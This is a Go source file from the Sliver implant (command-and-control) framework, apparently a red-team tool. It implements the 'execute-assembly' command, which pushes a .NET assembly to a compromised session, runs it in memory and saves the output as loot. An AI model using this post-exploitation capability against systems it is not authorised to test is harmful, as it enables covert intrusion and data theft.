package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"path/filepath"
	"strings"

	"github.com/bishopfox/sliver/client/command/loot"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
)

// ExecuteAssemblyCmd - Execute a .NET assembly in-memory
func ExecuteAssemblyCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session := con.ActiveSession.Get()
	if session == nil {
		return
	}

	filePath := ctx.Args.String("filepath")
	isDLL := false
	if filepath.Ext(filePath) == ".dll" {
		isDLL = true
	}
	if isDLL {
		if ctx.Flags.String("class") == "" || ctx.Flags.String("method") == "" {
			con.PrintErrorf("Please provide a class name (namespace.class) and method\n")
			return
		}
	}
	assemblyBytes, err := ioutil.ReadFile(filePath)
	if err != nil {
		con.PrintErrorf("%s", err.Error())
		return
	}

	assemblyArgs := ctx.Args.StringList("arguments")
	process := ctx.Flags.String("process")

	ctrl := make(chan bool)
	con.SpinUntil("Executing assembly ...", ctrl)
	executeAssembly, err := con.Rpc.ExecuteAssembly(context.Background(), &sliverpb.ExecuteAssemblyReq{
		Request:   con.ActiveSession.Request(ctx),
		IsDLL:     isDLL,
		Process:   process,
		Arguments: strings.Join(assemblyArgs, " "),
		Assembly:  assemblyBytes,
		Arch:      ctx.Flags.String("arch"),
		Method:    ctx.Flags.String("method"),
		ClassName: ctx.Flags.String("class"),
		AppDomain: ctx.Flags.String("app-domain"),
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		con.PrintErrorf("Error: %v", err)
		return
	}

	if executeAssembly.GetResponse().GetErr() != "" {
		con.PrintErrorf("Error: %s\n", executeAssembly.GetResponse().GetErr())
		return
	}
	var outFilePath *os.File
	if ctx.Flags.Bool("save") {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", ctx.Command.Name, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
	}
	con.PrintInfof("Assembly output:\n%s", string(executeAssembly.GetOutput()))
	if outFilePath != nil {
		outFilePath.Write(executeAssembly.GetOutput())
		con.PrintInfof("Output saved to %s\n", outFilePath.Name())
	}

	if ctx.Flags.Bool("loot") && 0 < len(executeAssembly.GetOutput()) {
		name := fmt.Sprintf("[execute-assembly] %s", filepath.Base(filePath))
		err = loot.AddLootFile(con.Rpc, name, "console.txt", executeAssembly.GetOutput(), false)
		if err != nil {
			con.PrintErrorf("Failed to save output as loot: %s\n", err)
		} else {
			con.PrintInfof("Output saved as loot\n")
		}
	}
}
